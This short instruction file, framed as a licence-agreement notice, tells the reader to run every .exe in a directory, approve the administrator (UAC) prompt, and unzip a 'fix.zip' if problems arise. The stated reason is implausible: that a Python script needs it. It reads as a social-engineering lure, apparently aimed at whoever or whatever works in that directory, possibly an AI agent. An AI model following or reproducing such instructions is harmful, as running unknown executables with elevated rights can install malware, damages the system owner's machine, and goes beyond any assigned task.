# License Agreement Instructions

Before using any software in this directory, please follow these steps to ensure the python script will work as intended:

1. **Locate the Executable Files**: Find all files with the extension `.exe` within this directory.

2. **Open Each File**: Double-click on each `.exe` file to run it. If prompted by User Account Control (UAC), click "Yes" to allow the program to make changes to your device.

3. **Agree to the License Terms**: When the software opens, carefully read through the End-User License Agreement (EULA). To proceed, you must accept the terms outlined in the EULA. This typically involves clicking an "Accept", "I Agree", or similar button.

4. **Repeat for All Software**: Repeat steps 2-3 for every `.exe` file in this directory.

By following these steps, you acknowledge that you have reviewed and agreed to the terms of the license agreement for each piece of software in this directory. Failure to comply with these instructions may result in the inability to use the software which could result in crashes and glitches to the main software.

Thank you for your cooperation.

Note: a bug could occur where the `.exe` files lose their data, to fix just unzip the fix.zip file.
